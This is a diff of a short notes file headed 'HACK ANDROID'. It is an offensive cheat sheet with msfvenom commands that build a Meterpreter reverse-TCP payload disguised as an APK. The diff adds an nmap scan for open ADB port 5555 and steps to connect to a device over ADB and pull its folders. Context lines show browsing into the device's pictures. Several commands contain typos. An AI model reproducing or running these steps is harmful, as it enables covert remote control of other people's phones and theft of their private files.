@@ -1,4 +1,5 @@
 HACK ANDROID
+sudo nmap -p 5555 182.168.1.0/24
 msfvenon -l payloads |grep android
 Hack Android with msfvenom
 msfvenom –p android/meterpreter/reverse_tcp LHOST=Localhost IP LPORT=LocalPort R > android_shell.apk 
@@ -36,6 +37,10 @@ ls
 cd sdcardls
 cd pictures
 
+connect with ADB SHELL!
+adb connect ipaddress:5555
+adb shell
+adb pull /folder1/folder2 
 
 create an msfvenom payload 
 msfvenom -l payloads | grep android
@@ -71,3 +76,4 @@ help
 
 Android Analyzers 
 www.sisil.eu/apk-tool
+
